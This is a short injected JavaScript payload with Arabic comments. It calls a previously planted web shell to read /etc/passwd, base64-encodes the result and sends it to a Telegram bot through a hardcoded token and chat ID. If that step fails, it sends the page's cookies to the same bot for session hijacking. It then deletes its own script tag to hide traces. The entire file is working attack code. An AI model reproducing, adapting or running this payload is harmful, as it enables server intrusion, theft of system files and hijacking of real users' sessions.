(function(){
    // البيانات الخاصة بك (Bot Token & Chat ID)
    const t = '8069664182:AAFYGUsmPL9YZTQJXCS2v_H4OIQsj9eOyIs';
    const c = '7962548184';
    const host = window.location.hostname;

    // محاولة سحب ملفات النظام عبر الـ RCE اللي زرعناه سابقاً
    // يمكنك تغيير 'cat /etc/passwd' لأي أمر آخر مثل 'ls -la'
    fetch('/shell.php?cmd=cat%20/etc/passwd')
    .then(r => r.text())
    .then(data => {
        // إرسال البيانات المسروقة إلى التليجرام
        // نستخدم btoa لتشفير البيانات المرسلة لتجنب مشاكل الرموز في الـ URL
        const payload = btoa(unescape(encodeURIComponent(data.substring(0, 3000))));
        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=🚨+NEW+LEAK+FROM:+${host}%0A%0AData+(Base64):%0A${payload}`);
    })
    .catch(e => {
        // في حالة فشل الـ RCE، يرسل الكوكيز كبديل (Session Hijacking)
        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=❌+RCE+Failed+on+${host},+sending+Cookies:%0A${document.cookie}`);
    });
    
    // مسح أثر السكريبت من الصفحة بعد التنفيذ
    document.currentScript ? document.currentScript.remove() : null;
})();
